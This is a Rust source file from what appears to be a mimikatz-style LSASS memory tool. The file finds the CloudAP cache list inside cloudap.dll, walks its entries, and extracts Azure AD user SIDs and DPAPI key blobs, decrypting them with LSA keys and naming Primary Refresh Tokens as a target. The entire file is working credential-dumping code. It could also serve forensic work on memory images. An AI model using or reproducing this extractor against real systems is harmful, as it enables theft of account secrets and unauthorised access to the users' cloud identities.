use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::CloudApCredential;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// KIWI_CLOUDAP_CACHE_LIST_ENTRY offsets (Windows 10 x64):
///   +0x00: Flink
///   +0x08: Blink
///   +0x10: lockList (PVOID)
///   +0x18..+0x48: unk fields
///   +0x48: unk6 (u32 + pad)
///   +0x50: LUID (u64)
///   +0x58: unk7 (u64)
///   +0x60: cacheEntry (PVOID -> KIWI_CLOUDAP_CACHE_ENTRY)
const OFFSET_FLINK: u64 = 0x00;
const OFFSET_LUID: u64 = 0x50;
const OFFSET_CACHE_ENTRY: u64 = 0x60;

/// KIWI_CLOUDAP_CACHE_ENTRY offsets:
///   +0x00: unk0 (u32 + pad)
///   +0x08: unk1 (PVOID)
///   +0x10: unk2 (PVOID)
///   +0x18: toDetermine (PVOID -> contains dpapi_key_rsa encrypted blob)
///   +0x20: unk3 (PVOID)
///   +0x28: unk4 (PVOID)
///   +0x30: unk5 (u32 + pad)
///   +0x38: unk6 (u64)
///   +0x40: unk7 (u32 + pad)
///   +0x48: PackageSid (PVOID -> user SID)
///   +0x50: unk8 (u64)
const ENTRY_TO_DETERMINE: u64 = 0x18;
const ENTRY_PACKAGE_SID: u64 = 0x48;

/// Extract CloudAP credentials from cloudap.dll.
///
/// CloudAP handles Azure AD authentication and stores Primary Refresh Tokens (PRT)
/// and DPAPI-NG protected session keys. The cache is a doubly-linked list in
/// cloudap.dll's .data section, found via a code pattern in .text.
pub fn extract_cloudap_credentials(
    vmem: &impl VirtualMemory,
    dll_base: u64,
    _dll_size: u32,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, CloudApCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, dll_base)?;

    // Try .text pattern scan first, fall back to .data section scan
    let list_addr = match pe.find_section(".text") {
        Some(text) => {
            let text_base = dll_base + text.virtual_address as u64;
            match patterns::find_pattern(
                vmem,
                text_base,
                text.virtual_size,
                patterns::CLOUDAP_CACHE_PATTERNS,
                "CloudApCache",
            ) {
                Ok((pattern_addr, _)) => {
                    patterns::find_list_via_lea(vmem, pattern_addr, "CloudAP cache list")?
                }
                Err(e) => {
                    log::debug!(
                        "CloudAP .text pattern scan failed ({}), trying .data fallback",
                        e
                    );
                    find_cloudap_cache_in_data(vmem, &pe, dll_base)?
                }
            }
        }
        None => find_cloudap_cache_in_data(vmem, &pe, dll_base)?,
    };

    log::info!("CloudAP cache list at 0x{:x}", list_addr);
    walk_cloudap_cache(vmem, list_addr, keys)
}

/// Walk the CloudAP cache linked list and extract entries.
fn walk_cloudap_cache(
    vmem: &impl VirtualMemory,
    list_addr: u64,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, CloudApCredential)>> {
    let mut results = Vec::new();

    let head_flink = vmem.read_virt_u64(list_addr)?;
    if head_flink == 0 || head_flink == list_addr {
        log::info!("CloudAP: cache list is empty");
        return Ok(results);
    }

    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = vmem.read_virt_u64(current + OFFSET_LUID).unwrap_or(0);
        let cache_entry_ptr = vmem
            .read_virt_u64(current + OFFSET_CACHE_ENTRY)
            .unwrap_or(0);

        if cache_entry_ptr > 0x10000 && (cache_entry_ptr >> 48) == 0 {
            if let Some(cred) = extract_cache_entry(vmem, cache_entry_ptr, keys) {
                log::info!(
                    "CloudAP: LUID=0x{:x} user={} domain={} dpapi_key_len={}",
                    luid,
                    cred.username,
                    cred.domain,
                    cred.dpapi_key.len()
                );
                results.push((luid, cred));
            }
        }

        current = match vmem.read_virt_u64(current + OFFSET_FLINK) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    log::info!("CloudAP: found {} cache entries", results.len());
    Ok(results)
}

/// Extract credential data from a single KIWI_CLOUDAP_CACHE_ENTRY.
fn extract_cache_entry(
    vmem: &impl VirtualMemory,
    entry_addr: u64,
    keys: &CryptoKeys,
) -> Option<CloudApCredential> {
    // Read the toDetermine pointer (contains DPAPI key blob)
    let to_determine_ptr = vmem.read_virt_u64(entry_addr + ENTRY_TO_DETERMINE).ok()?;

    // Read the PackageSid pointer to get the user SID (helps identify the account)
    let sid_ptr = vmem
        .read_virt_u64(entry_addr + ENTRY_PACKAGE_SID)
        .unwrap_or(0);

    // Try to extract DPAPI key from toDetermine structure
    let dpapi_key = if to_determine_ptr > 0x10000 && (to_determine_ptr >> 48) == 0 {
        extract_dpapi_key_from_blob(vmem, to_determine_ptr, keys)
    } else {
        Vec::new()
    };

    // Try to read SID string for username/domain info
    let (username, domain) = if sid_ptr > 0x10000 && (sid_ptr >> 48) == 0 {
        read_sid_string(vmem, sid_ptr)
    } else {
        (String::new(), String::new())
    };

    // Only return if we have something useful
    if dpapi_key.is_empty() && username.is_empty() {
        return None;
    }

    Some(CloudApCredential {
        username,
        domain,
        dpapi_key,
        prt: String::new(), // PRT requires DPAPI-NG decryption
    })
}

/// Extract DPAPI key from the toDetermine structure.
///
/// The toDetermine pointer leads to a structure containing an encrypted
/// DPAPI key blob. The blob format:
///   +0x00: cbKey (u32) - size of encrypted key
///   +0x04: padding
///   +0x08: pbKey (encrypted data, cbKey bytes)
fn extract_dpapi_key_from_blob(
    vmem: &impl VirtualMemory,
    blob_addr: u64,
    keys: &CryptoKeys,
) -> Vec<u8> {
    // Read the key size from the blob header
    let cb_key = match vmem.read_virt_u32(blob_addr) {
        Ok(s) if s > 0 && s <= 0x200 => s as usize,
        _ => return Vec::new(),
    };

    // Read the encrypted key data
    let enc_data = match vmem.read_virt_bytes(blob_addr + 0x08, cb_key) {
        Ok(d) => d,
        Err(_) => return Vec::new(),
    };

    // Try to decrypt using LSA keys
    match crate::lsass::crypto::decrypt_credential(keys, &enc_data) {
        Ok(d) if !d.is_empty() => d,
        _ => {
            // If decryption fails, return the raw encrypted blob for reference
            log::debug!(
                "CloudAP: DPAPI key decryption failed at 0x{:x}, storing encrypted blob",
                blob_addr
            );
            enc_data
        }
    }
}

/// Try to read a SID from memory and convert to a user-friendly string.
/// SID format: revision(1) sub_auth_count(1) authority(6) sub_auths(4*count)
fn read_sid_string(vmem: &impl VirtualMemory, sid_addr: u64) -> (String, String) {
    let header = match vmem.read_virt_bytes(sid_addr, 8) {
        Ok(d) => d,
        Err(_) => return (String::new(), String::new()),
    };

    let revision = header[0];
    let sub_auth_count = header[1] as usize;

    if revision != 1 || sub_auth_count == 0 || sub_auth_count > 15 {
        return (String::new(), String::new());
    }

    let authority = u64::from_be_bytes([
        0, 0, header[2], header[3], header[4], header[5], header[6], header[7],
    ]);

    let mut sub_auths = Vec::with_capacity(sub_auth_count);
    for i in 0..sub_auth_count {
        match vmem.read_virt_u32(sid_addr + 8 + (i as u64 * 4)) {
            Ok(sa) => sub_auths.push(sa),
            Err(_) => return (String::new(), String::new()),
        }
    }

    let sid_str = format!(
        "S-{}-{}{}",
        revision,
        authority,
        sub_auths
            .iter()
            .map(|sa| format!("-{}", sa))
            .collect::<String>()
    );

    // Use the SID as username, "AzureAD" as domain
    (sid_str, "AzureAD".to_string())
}

/// Fallback: scan cloudap.dll .data section for the cache LIST_ENTRY head.
fn find_cloudap_cache_in_data(
    vmem: &impl VirtualMemory,
    pe: &PeHeaders,
    dll_base: u64,
) -> Result<u64> {
    let data_sec = pe.find_section(".data").ok_or_else(|| {
        crate::error::GovmemError::PatternNotFound(".data section in cloudap.dll".to_string())
    })?;

    let data_base = dll_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    log::debug!(
        "CloudAP: scanning .data for cache list: base=0x{:x} size=0x{:x}",
        data_base,
        data_size
    );

    for off in (0..data_size.saturating_sub(16)).step_by(8) {
        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());

        let list_addr = data_base + off as u64;

        // Self-referencing empty list
        if flink == list_addr && blink == list_addr {
            if off < 0x1000 {
                log::debug!(
                    "CloudAP: found empty cache list at 0x{:x} (self-referencing)",
                    list_addr
                );
                return Ok(list_addr);
            }
            continue;
        }

        if flink < 0x10000 || (flink >> 48) != 0 {
            continue;
        }
        if blink < 0x10000 || (blink >> 48) != 0 {
            continue;
        }
        // Must point to heap, not within the DLL
        if flink >= dll_base && flink < dll_base + 0x100000 {
            continue;
        }

        // Validate: first entry's Flink
        let entry_flink = match vmem.read_virt_u64(flink) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if entry_flink != list_addr && (entry_flink < 0x10000 || (entry_flink >> 48) != 0) {
            continue;
        }

        // Validate: LUID at expected offset should be reasonable
        let luid = match vmem.read_virt_u64(flink + OFFSET_LUID) {
            Ok(l) => l,
            Err(_) => continue,
        };
        if luid == 0 || luid > 0xFFFFFFFF {
            continue;
        }

        // Validate: cacheEntry pointer at expected offset
        let cache_entry = match vmem.read_virt_u64(flink + OFFSET_CACHE_ENTRY) {
            Ok(p) => p,
            Err(_) => continue,
        };
        if cache_entry < 0x10000 || (cache_entry >> 48) != 0 {
            continue;
        }

        log::debug!(
            "CloudAP: found cache list candidate at 0x{:x}: flink=0x{:x} LUID=0x{:x}",
            list_addr,
            flink,
            luid
        );
        return Ok(list_addr);
    }

    Err(crate::error::GovmemError::PatternNotFound(
        "CloudAP cache list in cloudap.dll .data section".to_string(),
    ))
}
